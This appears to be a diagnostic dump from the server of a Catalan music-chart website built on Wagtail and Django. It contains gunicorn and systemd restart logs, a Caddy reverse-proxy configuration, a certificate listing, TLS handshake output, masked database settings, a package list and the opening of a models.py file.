+Oct 08 20:43:49 topquaranta-server gunicorn[3300835]: [2025-10-08 20:43:49 +0000] [3300835] [INFO] Starting gunicorn 23.\
+0.0
+Oct 08 20:43:49 topquaranta-server gunicorn[3300835]: [2025-10-08 20:43:49 +0000] [3300835] [INFO] Listening at: http://\
+127.0.0.1:8081 (3300835)
+Oct 08 20:43:49 topquaranta-server gunicorn[3300835]: [2025-10-08 20:43:49 +0000] [3300835] [INFO] Using worker: sync
+Oct 08 20:43:49 topquaranta-server gunicorn[3300837]: [2025-10-08 20:43:49 +0000] [3300837] [INFO] Booting worker with p\
+id: 3300837
+Oct 08 20:43:49 topquaranta-server gunicorn[3300838]: [2025-10-08 20:43:49 +0000] [3300838] [INFO] Booting worker with p\
+id: 3300838
+Oct 08 20:43:49 topquaranta-server gunicorn[3300839]: [2025-10-08 20:43:49 +0000] [3300839] [INFO] Booting worker with p\
+id: 3300839
+Oct 08 20:44:22 topquaranta-server gunicorn[3300837]: [2025-10-08 22:44:22 +0200] [3300837] [INFO] Worker exiting (pid: \
+3300837)
+Oct 08 20:44:22 topquaranta-server gunicorn[3300835]: [2025-10-08 20:44:22 +0000] [3300835] [INFO] Handling signal: term
+Oct 08 20:44:22 topquaranta-server systemd[1]: Stopping TopQuaranta - Wagtail (Django) public site...
+Oct 08 20:44:22 topquaranta-server gunicorn[3300838]: [2025-10-08 22:44:22 +0200] [3300838] [INFO] Worker exiting (pid: \
+3300838)
+Oct 08 20:44:22 topquaranta-server gunicorn[3300839]: [2025-10-08 22:44:22 +0200] [3300839] [INFO] Worker exiting (pid: \
+3300839)
+Oct 08 20:44:23 topquaranta-server gunicorn[3300835]: [2025-10-08 20:44:23 +0000] [3300835] [INFO] Shutting down: Master
+Oct 08 20:44:23 topquaranta-server systemd[1]: topquaranta_web.service: Deactivated successfully.
+Oct 08 20:44:23 topquaranta-server systemd[1]: Stopped TopQuaranta - Wagtail (Django) public site.
+Oct 08 20:44:23 topquaranta-server systemd[1]: topquaranta_web.service: Consumed 5.166s CPU time.
+Oct 08 20:44:23 topquaranta-server systemd[1]: Started TopQuaranta - Wagtail (Django) public site.
+Oct 08 20:44:23 topquaranta-server gunicorn[3300874]: [2025-10-08 20:44:23 +0000] [3300874] [INFO] Starting gunicorn 23.\
+0.0
+Oct 08 20:44:23 topquaranta-server gunicorn[3300874]: [2025-10-08 20:44:23 +0000] [3300874] [INFO] Listening at: http://\
+127.0.0.1:8081 (3300874)
+Oct 08 20:44:23 topquaranta-server gunicorn[3300874]: [2025-10-08 20:44:23 +0000] [3300874] [INFO] Using worker: sync
+Oct 08 20:44:23 topquaranta-server gunicorn[3300876]: [2025-10-08 20:44:23 +0000] [3300876] [INFO] Booting worker with p\
+id: 3300876
+Oct 08 20:44:23 topquaranta-server gunicorn[3300877]: [2025-10-08 20:44:23 +0000] [3300877] [INFO] Booting worker with p\
+id: 3300877
+Oct 08 20:44:23 topquaranta-server gunicorn[3300887]: [2025-10-08 20:44:23 +0000] [3300887] [INFO] Booting worker with p\
+id: 3300887
+Oct 08 20:48:47 topquaranta-server systemd[1]: Stopping TopQuaranta - Wagtail (Django) public site...
+Oct 08 20:48:47 topquaranta-server gunicorn[3300876]: [2025-10-08 22:48:47 +0200] [3300876] [INFO] Worker exiting (pid: \
+3300876)
+Oct 08 20:48:47 topquaranta-server gunicorn[3300877]: [2025-10-08 22:48:47 +0200] [3300877] [INFO] Worker exiting (pid: \
+3300877)
+Oct 08 20:48:47 topquaranta-server gunicorn[3300887]: [2025-10-08 22:48:47 +0200] [3300887] [INFO] Worker exiting (pid: \
+3300887)
+Oct 08 20:48:47 topquaranta-server gunicorn[3300874]: [2025-10-08 20:48:47 +0000] [3300874] [INFO] Handling signal: term
+Oct 08 20:48:47 topquaranta-server gunicorn[3300874]: [2025-10-08 20:48:47 +0000] [3300874] [ERROR] Worker (pid:3300876)\
+ was sent SIGTERM!
+Oct 08 20:48:47 topquaranta-server gunicorn[3300874]: [2025-10-08 20:48:47 +0000] [3300874] [ERROR] Worker (pid:3300877)\
+ was sent SIGTERM!
+Oct 08 20:48:47 topquaranta-server gunicorn[3300874]: [2025-10-08 20:48:47 +0000] [3300874] [ERROR] Worker (pid:3300887)\
+ was sent SIGTERM!
+Oct 08 20:48:47 topquaranta-server gunicorn[3300874]: [2025-10-08 20:48:47 +0000] [3300874] [INFO] Shutting down: Master
+Oct 08 20:48:47 topquaranta-server systemd[1]: topquaranta_web.service: Deactivated successfully.
+Oct 08 20:48:47 topquaranta-server systemd[1]: Stopped TopQuaranta - Wagtail (Django) public site.
+Oct 08 20:48:47 topquaranta-server systemd[1]: topquaranta_web.service: Consumed 5.138s CPU time.
+Oct 08 20:48:47 topquaranta-server systemd[1]: Started TopQuaranta - Wagtail (Django) public site.
+Oct 08 20:48:48 topquaranta-server gunicorn[3300975]: [2025-10-08 20:48:48 +0000] [3300975] [INFO] Starting gunicorn 23.\
+0.0
+Oct 08 20:48:48 topquaranta-server gunicorn[3300975]: [2025-10-08 20:48:48 +0000] [3300975] [INFO] Listening at: http://\
+127.0.0.1:8081 (3300975)
+Oct 08 20:48:48 topquaranta-server gunicorn[3300975]: [2025-10-08 20:48:48 +0000] [3300975] [INFO] Using worker: sync
+Oct 08 20:48:48 topquaranta-server gunicorn[3300977]: [2025-10-08 20:48:48 +0000] [3300977] [INFO] Booting worker with p\
+id: 3300977
+Oct 08 20:48:48 topquaranta-server gunicorn[3300978]: [2025-10-08 20:48:48 +0000] [3300978] [INFO] Booting worker with p\
+id: 3300978
+Oct 08 20:48:48 topquaranta-server gunicorn[3300979]: [2025-10-08 20:48:48 +0000] [3300979] [INFO] Booting worker with p\
+id: 3300979
+Oct 08 20:50:21 topquaranta-server gunicorn[3300977]: [2025-10-08 22:50:21 +0200] [3300977] [INFO] Worker exiting (pid: \
+3300977)
+Oct 08 20:50:21 topquaranta-server gunicorn[3300975]: [2025-10-08 20:50:21 +0000] [3300975] [INFO] Handling signal: term
+Oct 08 20:50:21 topquaranta-server gunicorn[3300979]: [2025-10-08 22:50:21 +0200] [3300979] [INFO] Worker exiting (pid: \
+3300979)
+Oct 08 20:50:21 topquaranta-server systemd[1]: Stopping TopQuaranta - Wagtail (Django) public site...
+Oct 08 20:50:21 topquaranta-server gunicorn[3300978]: [2025-10-08 22:50:21 +0200] [3300978] [INFO] Worker exiting (pid: \
+3300978)
+Oct 08 20:50:21 topquaranta-server gunicorn[3300975]: [2025-10-08 20:50:21 +0000] [3300975] [ERROR] Worker (pid:3300979)\
+ was sent SIGTERM!
+Oct 08 20:50:21 topquaranta-server gunicorn[3300975]: [2025-10-08 20:50:21 +0000] [3300975] [INFO] Shutting down: Master
+Oct 08 20:50:21 topquaranta-server systemd[1]: topquaranta_web.service: Deactivated successfully.
+Oct 08 20:50:21 topquaranta-server systemd[1]: Stopped TopQuaranta - Wagtail (Django) public site.
+Oct 08 20:50:21 topquaranta-server systemd[1]: topquaranta_web.service: Consumed 5.403s CPU time.
+Oct 08 20:50:21 topquaranta-server systemd[1]: Started TopQuaranta - Wagtail (Django) public site.
+Oct 08 20:50:21 topquaranta-server gunicorn[3301028]: [2025-10-08 20:50:21 +0000] [3301028] [INFO] Starting gunicorn 23.\
+0.0
+Oct 08 20:50:21 topquaranta-server gunicorn[3301028]: [2025-10-08 20:50:21 +0000] [3301028] [INFO] Listening at: http://\
+127.0.0.1:8081 (3301028)
+Oct 08 20:50:21 topquaranta-server gunicorn[3301028]: [2025-10-08 20:50:21 +0000] [3301028] [INFO] Using worker: sync
+Oct 08 20:50:21 topquaranta-server gunicorn[3301031]: [2025-10-08 20:50:21 +0000] [3301031] [INFO] Booting worker with p\
+id: 3301031
+Oct 08 20:50:21 topquaranta-server gunicorn[3301032]: [2025-10-08 20:50:21 +0000] [3301032] [INFO] Booting worker with p\
+id: 3301032
+Oct 08 20:50:21 topquaranta-server gunicorn[3301033]: [2025-10-08 20:50:21 +0000] [3301033] [INFO] Booting worker with p\
+id: 3301033
+Oct 08 20:50:48 topquaranta-server systemd[1]: Stopping TopQuaranta - Wagtail (Django) public site...
+Oct 08 20:50:48 topquaranta-server gunicorn[3301031]: [2025-10-08 22:50:48 +0200] [3301031] [INFO] Worker exiting (pid: \
+3301031)
+Oct 08 20:50:48 topquaranta-server gunicorn[3301028]: [2025-10-08 20:50:48 +0000] [3301028] [INFO] Handling signal: term
+Oct 08 20:50:48 topquaranta-server gunicorn[3301032]: [2025-10-08 22:50:48 +0200] [3301032] [INFO] Worker exiting (pid: \
+3301032)
+Oct 08 20:50:48 topquaranta-server gunicorn[3301033]: [2025-10-08 22:50:48 +0200] [3301033] [INFO] Worker exiting (pid: \
+3301033)
+Oct 08 20:50:48 topquaranta-server gunicorn[3301028]: [2025-10-08 20:50:48 +0000] [3301028] [ERROR] Worker (pid:3301031)\
+ was sent SIGTERM!
+Oct 08 20:50:48 topquaranta-server gunicorn[3301028]: [2025-10-08 20:50:48 +0000] [3301028] [INFO] Shutting down: Master
+Oct 08 20:50:48 topquaranta-server systemd[1]: topquaranta_web.service: Deactivated successfully.
+Oct 08 20:50:48 topquaranta-server systemd[1]: Stopped TopQuaranta - Wagtail (Django) public site.
+Oct 08 20:50:48 topquaranta-server systemd[1]: topquaranta_web.service: Consumed 5.000s CPU time.
+Oct 08 20:50:48 topquaranta-server systemd[1]: Started TopQuaranta - Wagtail (Django) public site.
+Oct 08 20:50:48 topquaranta-server gunicorn[3301068]: [2025-10-08 20:50:48 +0000] [3301068] [INFO] Starting gunicorn 23.\
+0.0
+Oct 08 20:50:48 topquaranta-server gunicorn[3301068]: [2025-10-08 20:50:48 +0000] [3301068] [INFO] Listening at: http://\
+127.0.0.1:8081 (3301068)
+Oct 08 20:50:48 topquaranta-server gunicorn[3301068]: [2025-10-08 20:50:48 +0000] [3301068] [INFO] Using worker: sync
+Oct 08 20:50:48 topquaranta-server gunicorn[3301071]: [2025-10-08 20:50:48 +0000] [3301071] [INFO] Booting worker with p\
+id: 3301071
+Oct 08 20:50:48 topquaranta-server gunicorn[3301072]: [2025-10-08 20:50:48 +0000] [3301072] [INFO] Booting worker with p\
+id: 3301072
+Oct 08 20:50:48 topquaranta-server gunicorn[3301073]: [2025-10-08 20:50:48 +0000] [3301073] [INFO] Booting worker with p\
+id: 3301073
+Oct 08 20:52:27 topquaranta-server systemd[1]: Stopping TopQuaranta - Wagtail (Django) public site...
+Oct 08 20:52:27 topquaranta-server gunicorn[3301068]: [2025-10-08 20:52:27 +0000] [3301068] [INFO] Handling signal: term
+Oct 08 20:52:27 topquaranta-server gunicorn[3301072]: [2025-10-08 22:52:27 +0200] [3301072] [INFO] Worker exiting (pid: \
+3301072)
+Oct 08 20:52:27 topquaranta-server gunicorn[3301071]: [2025-10-08 22:52:27 +0200] [3301071] [INFO] Worker exiting (pid: \
+3301071)
+Oct 08 20:52:27 topquaranta-server gunicorn[3301073]: [2025-10-08 22:52:27 +0200] [3301073] [INFO] Worker exiting (pid: \
+3301073)
+Oct 08 20:52:28 topquaranta-server gunicorn[3301068]: [2025-10-08 20:52:28 +0000] [3301068] [INFO] Shutting down: Master
+Oct 08 20:52:28 topquaranta-server systemd[1]: topquaranta_web.service: Deactivated successfully.
+Oct 08 20:52:28 topquaranta-server systemd[1]: Stopped TopQuaranta - Wagtail (Django) public site.
+Oct 08 20:52:28 topquaranta-server systemd[1]: topquaranta_web.service: Consumed 5.695s CPU time.
+Oct 08 20:52:28 topquaranta-server systemd[1]: Started TopQuaranta - Wagtail (Django) public site.
+Oct 08 20:52:28 topquaranta-server gunicorn[3301123]: [2025-10-08 20:52:28 +0000] [3301123] [INFO] Starting gunicorn 23.\
+0.0
+Oct 08 20:52:28 topquaranta-server gunicorn[3301123]: [2025-10-08 20:52:28 +0000] [3301123] [INFO] Listening at: http://\
+127.0.0.1:8081 (3301123)
+Oct 08 20:52:28 topquaranta-server gunicorn[3301123]: [2025-10-08 20:52:28 +0000] [3301123] [INFO] Using worker: sync
+Oct 08 20:52:28 topquaranta-server gunicorn[3301126]: [2025-10-08 20:52:28 +0000] [3301126] [INFO] Booting worker with p\
+id: 3301126
+Oct 08 20:52:28 topquaranta-server gunicorn[3301127]: [2025-10-08 20:52:28 +0000] [3301127] [INFO] Booting worker with p\
+id: 3301127
+Oct 08 20:52:28 topquaranta-server gunicorn[3301128]: [2025-10-08 20:52:28 +0000] [3301128] [INFO] Booting worker with p\
+id: 3301128
+Oct 08 20:57:00 topquaranta-server systemd[1]: Stopping TopQuaranta - Wagtail (Django) public site...
+Oct 08 20:57:00 topquaranta-server gunicorn[3301127]: [2025-10-08 22:57:00 +0200] [3301127] [INFO] Worker exiting (pid: \
+3301127)
+Oct 08 20:57:00 topquaranta-server gunicorn[3301126]: [2025-10-08 22:57:00 +0200] [3301126] [INFO] Worker exiting (pid: \
+3301126)
+Oct 08 20:57:00 topquaranta-server gunicorn[3301128]: [2025-10-08 22:57:00 +0200] [3301128] [INFO] Worker exiting (pid: \
+3301128)
+Oct 08 20:57:00 topquaranta-server gunicorn[3301123]: [2025-10-08 20:57:00 +0000] [3301123] [INFO] Handling signal: term
+Oct 08 20:57:00 topquaranta-server gunicorn[3301123]: [2025-10-08 20:57:00 +0000] [3301123] [ERROR] Worker (pid:3301126)\
+ was sent SIGTERM!
+Oct 08 20:57:00 topquaranta-server gunicorn[3301123]: [2025-10-08 20:57:00 +0000] [3301123] [ERROR] Worker (pid:3301128)\
+ was sent SIGTERM!
+Oct 08 20:57:00 topquaranta-server gunicorn[3301123]: [2025-10-08 20:57:00 +0000] [3301123] [INFO] Shutting down: Master
+Oct 08 20:57:00 topquaranta-server systemd[1]: topquaranta_web.service: Deactivated successfully.
+Oct 08 20:57:00 topquaranta-server systemd[1]: Stopped TopQuaranta - Wagtail (Django) public site.
+Oct 08 20:57:00 topquaranta-server systemd[1]: topquaranta_web.service: Consumed 8.072s CPU time.
+Oct 08 20:57:00 topquaranta-server systemd[1]: Started TopQuaranta - Wagtail (Django) public site.
+Oct 08 20:57:00 topquaranta-server gunicorn[3301230]: [2025-10-08 20:57:00 +0000] [3301230] [INFO] Starting gunicorn 23.\
+0.0
+Oct 08 20:57:00 topquaranta-server gunicorn[3301230]: [2025-10-08 20:57:00 +0000] [3301230] [INFO] Listening at: http://\
+127.0.0.1:8081 (3301230)
+Oct 08 20:57:00 topquaranta-server gunicorn[3301230]: [2025-10-08 20:57:00 +0000] [3301230] [INFO] Using worker: sync
+Oct 08 20:57:00 topquaranta-server gunicorn[3301232]: [2025-10-08 20:57:00 +0000] [3301232] [INFO] Booting worker with p\
+id: 3301232
+Oct 08 20:57:00 topquaranta-server gunicorn[3301233]: [2025-10-08 20:57:00 +0000] [3301233] [INFO] Booting worker with p\
+id: 3301233
+Oct 08 20:57:00 topquaranta-server gunicorn[3301234]: [2025-10-08 20:57:00 +0000] [3301234] [INFO] Booting worker with p\
+id: 3301234
+Oct 08 21:00:00 topquaranta-server gunicorn[3301233]: [WARNING] 2025-10-08 23:00:00,000 django.request: Not Found: /admi\
+n/pending_artists/
+Oct 08 21:00:00 topquaranta-server gunicorn[3301233]: [WARNING] 2025-10-08 23:00:00,000 django.request: Not Found: /admi\
+n/pending_artists/
+Oct 08 21:00:25 topquaranta-server gunicorn[3301234]: [WARNING] 2025-10-08 23:00:25,570 django.request: Not Found: /admi\
+n/pending_artists/
+Oct 08 21:00:25 topquaranta-server gunicorn[3301234]: [WARNING] 2025-10-08 23:00:25,570 django.request: Not Found: /admi\
+n/pending_artists/
+
+==== 🌍 Config Caddy ====
+---- /etc/caddy/Caddyfile ----
+{
+	# Rebràs avisos d'expiració i errors d'emissió
+	email admin@topquaranta.cat
+}
+
+# — Apex → WWW (canònic)
+topquaranta.cat {
+    # envia HSTS també en la redirecció de l’apex
+    header {
+        Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
+    }
+    redir https://www.topquaranta.cat{uri} 301
+}
+
+# — Lloc principal
+www.topquaranta.cat {
+	encode zstd gzip
+
+	# Proxy cap al Gunicorn que tens a 8081
+	reverse_proxy 127.0.0.1:8081
+
+	# Capçaleres de seguretat bàsiques
+	header {
+		Referrer-Policy "strict-origin-when-cross-origin"
+		Permissions-Policy "geolocation=(), microphone=(), camera=()"
+		Content-Security-Policy "upgrade-insecure-requests"
+	}
+	log {
+		output file /var/log/caddy/topquaranta_access.log {
+			roll_size 10MiB
+			roll_keep 5
+		}
+	}
+}
+
+→ Versió Caddy:
+v2.10.2 h1:g/gTYjGMD0dec+UgMw8SnfmJ3I9+M2TdvoRL/Ovu6U8=
+
+→ Mòduls Caddy (resum):
+admin.api.load
+admin.api.metrics
+admin.api.pki
+admin.api.reverse_proxy
+caddy.adapters.caddyfile
+caddy.config_loaders.http
+caddy.filesystems
+caddy.listeners.http_redirect
+caddy.listeners.proxy_protocol
+caddy.listeners.tls
+caddy.logging.cores.mock
+caddy.logging.encoders.append
+caddy.logging.encoders.console
+caddy.logging.encoders.filter
+caddy.logging.encoders.filter.cookie
+caddy.logging.encoders.filter.delete
+caddy.logging.encoders.filter.hash
+caddy.logging.encoders.filter.ip_mask
+caddy.logging.encoders.filter.query
+caddy.logging.encoders.filter.regexp
+caddy.logging.encoders.filter.rename
+caddy.logging.encoders.filter.replace
+caddy.logging.encoders.json
+caddy.logging.writers.discard
+caddy.logging.writers.file
+caddy.logging.writers.net
+caddy.logging.writers.stderr
+caddy.logging.writers.stdout
+caddy.network_proxy.none
+caddy.network_proxy.url
+
+→ Certs emmagatzemats per Caddy:
+/var/lib/caddy/.local/share/caddy/certificates:
+acme-v02.api.letsencrypt.org-directory
+
+/var/lib/caddy/.local/share/caddy/certificates/acme-v02.api.letsencrypt.org-directory:
+188-245-60-20.sslip.io
+topquaranta.cat
+www.topquaranta.cat
+
+/var/lib/caddy/.local/share/caddy/certificates/acme-v02.api.letsencrypt.org-directory/188-245-60-20.sslip.io:
+188-245-60-20.sslip.io.crt
+188-245-60-20.sslip.io.json
+188-245-60-20.sslip.io.key
+
+/var/lib/caddy/.local/share/caddy/certificates/acme-v02.api.letsencrypt.org-directory/topquaranta.cat:
+topquaranta.cat.crt
+topquaranta.cat.json
+topquaranta.cat.key
+
+/var/lib/caddy/.local/share/caddy/certificates/acme-v02.api.letsencrypt.org-directory/www.topquaranta.cat:
+www.topquaranta.cat.crt
+www.topquaranta.cat.json
+www.topquaranta.cat.key
+
+==== 🔐 Prova TLS amb curl (headers) ====
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 188.245.60.20:443...
+* Connected to www.topquaranta.cat (188.245.60.20) port 443 (#0)
+* ALPN, offering h2
+* ALPN, offering http/1.1
+* TLSv1.0 (OUT), TLS header, Certificate Status (22):
+} [5 bytes data]
+* TLSv1.3 (OUT), TLS handshake, Client hello (1):
+} [512 bytes data]
+* TLSv1.2 (IN), TLS header, Certificate Status (22):
+{ [5 bytes data]
+* TLSv1.3 (IN), TLS handshake, Server hello (2):
+{ [122 bytes data]
+* TLSv1.2 (IN), TLS header, Finished (20):
+{ [5 bytes data]
+* TLSv1.2 (IN), TLS header, Supplemental data (23):
+{ [5 bytes data]
+* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
+{ [19 bytes data]
+* TLSv1.2 (IN), TLS header, Supplemental data (23):
+{ [5 bytes data]
+* TLSv1.3 (IN), TLS handshake, Certificate (11):
+{ [2052 bytes data]
+* TLSv1.2 (IN), TLS header, Supplemental data (23):
+{ [5 bytes data]
+* TLSv1.3 (IN), TLS handshake, CERT verify (15):
+{ [79 bytes data]
+* TLSv1.2 (IN), TLS header, Supplemental data (23):
+{ [5 bytes data]
+* TLSv1.3 (IN), TLS handshake, Finished (20):
+{ [36 bytes data]
+* TLSv1.2 (OUT), TLS header, Finished (20):
+} [5 bytes data]
+* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
+} [1 bytes data]
+* TLSv1.2 (OUT), TLS header, Supplemental data (23):
+} [5 bytes data]
+* TLSv1.3 (OUT), TLS handshake, Finished (20):
+} [36 bytes data]
+
+==== 🐘 DB settings efectives ====
+ENGINE: django.db.backends.postgresql
+HOST: localhost
+PORT: 5432
+NAME: topquaranta
+USER: topquaranta
+PASSWORD: ****
+
+==== 📦 Paquets Python (freeze) ====
+Django==5.1.11
+django-allauth==64.1.0
+django-filter==25.1
+django-modelcluster==6.4
+django-permissionedforms==0.1
+django-stubs-ext==5.2.2
+django-taggit==6.1.0
+django-tasks==0.7.0
+django-treebeard==4.7.1
+djangorestframework==3.16.1
+gunicorn==23.0.0
+psycopg2-binary==2.9.10
+wagtail==7.0.3
+wagtail-modeladmin==2.2.0
+whitenoise==6.9.0
+
+==== 🗂️ Static/Media paths i existència ====
+STATIC_URL: /static/
+STATIC_ROOT: /root/TopQuaranta_Local/web_cms/staticfiles → exists: True
+STATICFILES_DIRS: ['/root/TopQuaranta_Local/web_cms/tqcms/static']
+MEDIA_URL: /media/
+MEDIA_ROOT: /root/TopQuaranta_Local/web_cms/media → exists: True
+
+==== 🧭 URL root i versió Wagtail ====
+ROOT_URLCONF: tqcms.urls
+Wagtail version: 7.0.3.final.1
+
+==== 🧠 Models & StreamFields — home/models.py ====
+— Classes Page / StreamFields:
+22:from wagtail.fields import RichTextField, StreamField
+34:class HomePage(Page):
+36:    Pàgina d'inici construïda des de l'admin amb blocs (StreamField).
+51:    body = StreamField(
+60:    content_panels = Page.content_panels + [
+202:class MusicIndexPage(RoutablePageMixin, Page):
+851:class ArtistsPage(Page):
+866:class AlbumsPage(Page):
+879:class SongsPage(Page):
+
+— Mètodes (get_context / serve):
+860:    def serve(self, request):
+874:    def serve(self, request):
+887:    def serve(self, request):
+
+— Capçalera (1–220):
+     1	# --- Standard library ---
+     2	from urllib.parse import urlencode
+     3	
+     4	# --- Django ---
+     5	from django.conf import settings
+     6	from django.contrib.postgres.fields import ArrayField
+     7	from django.core.cache import cache
+     8	from django.core.paginator import EmptyPage, Paginator
+     9	from django.core.validators import RegexValidator
+    10	from django.db import models, transaction
+    11	from django.http import Http404, JsonResponse
+    12	from django.shortcuts import redirect, render
+    13	from django.utils.text import slugify
+    14	from django.core.validators import MinValueValidator, MaxValueValidator
+    15	
+    16	
+    17	# --- Wagtail ---
+    18	from wagtail import blocks
+    19	from wagtail.admin.panels import FieldPanel, MultiFieldPanel, HelpPanel, InlinePanel
+    20	from wagtail.contrib.routable_page.models import RoutablePageMixin, route
+    21	from wagtail.contrib.settings.models import BaseSiteSetting, register_setting
+    22	from wagtail.fields import RichTextField, StreamField
+    23	from wagtail.models import Page, Orderable, Site
+    24	from wagtail.snippets.models import register_snippet
+    25	from modelcluster.models import ClusterableModel
+    26	from modelcluster.fields import ParentalKey
+    27	
+    28	
+    29	# --- Project-local ---
+    30	from .blocks import CarouselBlock
+    31	
+    32	
+    33	# --- Pages ---
+    34	class HomePage(Page):
+    35	    """
+    36	    Pàgina d'inici construïda des de l'admin amb blocs (StreamField).
+    37	    A l'admin: Pàgines → Home → Body (afegeix blocs "Hero", "Graella d'Àlbums", etc.).
+    38	    """
+    39	    # --- Hero (nadiu, simple) ---
+    40	    hero_title = models.CharField(max_length=120, blank=True)
+    41	    hero_subtitle = models.CharField(max_length=255, blank=True)
+    42	    hero_image = models.ForeignKey(
+    43	        "wagtailimages.Image",
+    44	        null=True, blank=True,
+    45	        on_delete=models.SET_NULL,
+    46	        related_name="+",
+    47	    )
+    48	    hero_cta_text = models.CharField(max_length=80, blank=True)
+    49	    hero_cta_url = models.URLField(blank=True)
+    50	
+    51	    body = StreamField(
+    52	        [
+    53	            ("text", blocks.RichTextBlock()),
+    54	            ("carousel", CarouselBlock()),
+    55	        ],
+    56	        use_json_field=True,
+    57	        blank=True,
+    58	    )
+    59	
+    60	    content_panels = Page.content_panels + [
+    61	        MultiFieldPanel(
+    62	            [
+    63	                FieldPanel("hero_title"),
+    64	                FieldPanel("hero_subtitle"),
+    65	                FieldPanel("hero_image"),
+    66	                FieldPanel("hero_cta_text"),
+    67	                FieldPanel("hero_cta_url"),
+    68	            ],
+    69	            heading="Hero (portada)"
+    70	        ),
+    71	        FieldPanel("body"),
+    72	    ]
+    73	
+    74	
+    75	# --- Databases ---
+    76	class CmsArtista(models.Model):
+    77	    """
+    78	    Mapa ORM a la taula existent `cms_artists` (UNMANAGED).
+    79	    No genera migracions ni taules; només llig dades per a l'admin/consulta.
+    80	    """
+    81	
+    82	    # 1) Identificació
+    83	    id_spotify = models.CharField("ID Spotify", max_length=50, primary_key=True)
+    84	    nom = models.CharField("Nom", max_length=255, blank=False, null=False)
+    85	
+    86	    # 2) Localització
+    87	    territori = models.CharField("Territori", max_length=50, blank=True, null=False)
+    88	    comarca = models.CharField("Comarca", max_length=255, blank=True, null=False)
+    89	    localitat = models.CharField("Localitat", max_length=255, blank=True, null=False)
+    90	
+    91	    # 3) Etiquetes
+    92	    generes = models.TextField("Gèneres", blank=True, null=True)
+    93	    DONES_CHOICES = (("0%", "0%"), ("<50%", "<50%"), (">50%", ">50%"), ("100%", "100%"))
+    94	    dones = models.CharField(
+    95	        "Dones", max_length=4, choices=DONES_CHOICES, blank=True, null=True
+    96	    )
+    97	
+    98	    # 4) Contacte
+    99	    agencia = models.CharField("Agència", max_length=255, blank=True, null=True)
+   100	    email = models.TextField("Email", blank=True, null=True)
+   101	    telefon = models.TextField("Telèfon", blank=True, null=True)
+   102	
+   103	    # 5) Enllaços
+   104	    web = models.TextField("Web", blank=True, null=True)
+   105	    viquipedia = models.TextField("Viquipèdia", blank=True, null=True)
+   106	    id_viasona = models.TextField("ID Viasona", blank=True, null=True)
+   107	
+   108	    # 6) Xarxes
+   109	    instagram = models.CharField("Instagram", max_length=255, blank=True, null=True)
+   110	    youtube = models.TextField("YouTube", blank=True, null=True)
+   111	    tiktok = models.TextField("TikTok", blank=True, null=True)
+   112	    bluesky = models.TextField("Bluesky", blank=True, null=True)
+   113	
+   114	    # 7) Música
+   115	    soundcloud = models.TextField("SoundCloud", blank=True, null=True)
+   116	    bandcamp = models.TextField("Bandcamp", blank=True, null=True)
+   117	    deezer = models.TextField("Deezer", blank=True, null=True)
+   118	    myspace = models.TextField("MySpace", blank=True, null=True)
+   119	
+   120	    # 8) Contingut
+   121	    bio = models.TextField("Bio", blank=True, null=True)
+   122	
+   123	    # 9) Dades Spotify (només lectura al CMS)
+   124	    nom_spotify = models.TextField("Nom Spotify", blank=True, null=True)
+   125	    followers = models.IntegerField("Followers", blank=True, null=True)
+   126	    popularitat = models.IntegerField("Popularitat", blank=True, null=True)
+   127	    imatge_url = models.TextField("Imatge (URL)", blank=True, null=True)
+   128	
+   129	    # 10) Traça
+   130	    created_at = models.DateTimeField("Creat", auto_now_add=True)
+   131	    updated_at = models.DateTimeField("Actualitzat", auto_now=True)
+   132	
+   133	    class Meta:
+   134	        managed = False
+   135	        db_table = "cms_artists"
+   136	        ordering = ("nom",)
+   137	        verbose_name = "Artista"
+   138	        verbose_name_plural = "Artistes"
+   139	
+   140	    def __str__(self):
+   141	        return self.nom or self.id_spotify
+   142	
+   143	
+   144	class CmsAlbum(models.Model):
+   145	    """
+   146	    Mapa ORM (UNMANAGED) a la taula materialitzada `cms_albums`.
+   147	    """
+   148	
+   149	    id = models.CharField("ID Spotify", max_length=50, primary_key=True)
+   150	    name = models.TextField("Nom")
+   151	    album_type = models.TextField("Tipus")
+   152	    release_date = models.TextField("Data")
+   153	    image_url = models.TextField("Caràtula", blank=True, null=True)
+   154	    artist_ids = ArrayField(
+   155	        models.TextField(), verbose_name="IDs Artistes", blank=True, null=True
+   156	    )
+   157	    artist_names = ArrayField(
+   158	        models.TextField(), verbose_name="Artistes", blank=True, null=True
+   159	    )
+   160	    artist_names_str = models.TextField("Artistes str", blank=True, null=True)
+   161	
+   162	    class Meta:
+   163	        managed = False
+   164	        db_table = "cms_albums"
+   165	        ordering = ("release_date", "name")
+   166	        verbose_name = "Àlbum"
+   167	        verbose_name_plural = "Àlbums"
+   168	
+   169	    def __str__(self):
+   170	        return self.name or self.id
+   171	
+   172	
+   173	class CmsSong(models.Model):
+   174	    """
+   175	    Mapa ORM (UNMANAGED) a la taula materialitzada `cms_songs`.
+   176	    """
+   177	
+   178	    id = models.CharField("ID Spotify", max_length=50, primary_key=True)
+   179	    name = models.TextField("Nom")
+   180	    popularity = models.IntegerField("Popularitat", blank=True, null=True)
+   181	    isrc = models.TextField("ISRC", blank=True, null=True)
+   182	    artist_ids = ArrayField(
+   183	        models.TextField(), verbose_name="IDs Artistes", blank=True, null=True
+   184	    )
+   185	    artist_names = ArrayField(
+   186	        models.TextField(), verbose_name="Artistes", blank=True, null=True
+   187	    )
+   188	    artist_names_str = models.TextField("Artistes str", blank=True, null=True)
+   189	    album_id = models.CharField("ID Àlbum", max_length=50)
+   190	
+   191	    class Meta:
+   192	        managed = False
+   193	        db_table = "cms_songs"
+   194	        ordering = ("-popularity", "name")
+   195	        verbose_name = "Cançó"
+   196	        verbose_name_plural = "Cançons"
+   197	
+   198	    def __str__(self):
+   199	        return self.name or self.id
+   200	
+   201	
+   202	class MusicIndexPage(RoutablePageMixin, Page):
+   203	    """
+   204	    Pàgina índex amb subrutes per navegar per ÀLBUMS / ARTISTES / CANÇONS
+   205	    usant taules materialitzades (cms_*) via ORM, amb filtres, ordre i caché curt.
+   206	    """
+   207	
+   208	    parent_page_types = ["home.HomePage", "wagtailcore.Page"]
+   209	    subpage_types = ["home.ArtistsPage", "home.AlbumsPage", "home.SongsPage"]
+   210	
+   211	    # ---------- Helpers ----------
+   212	    def _cache_get_or_set(self, key: str, producer, timeout=120):
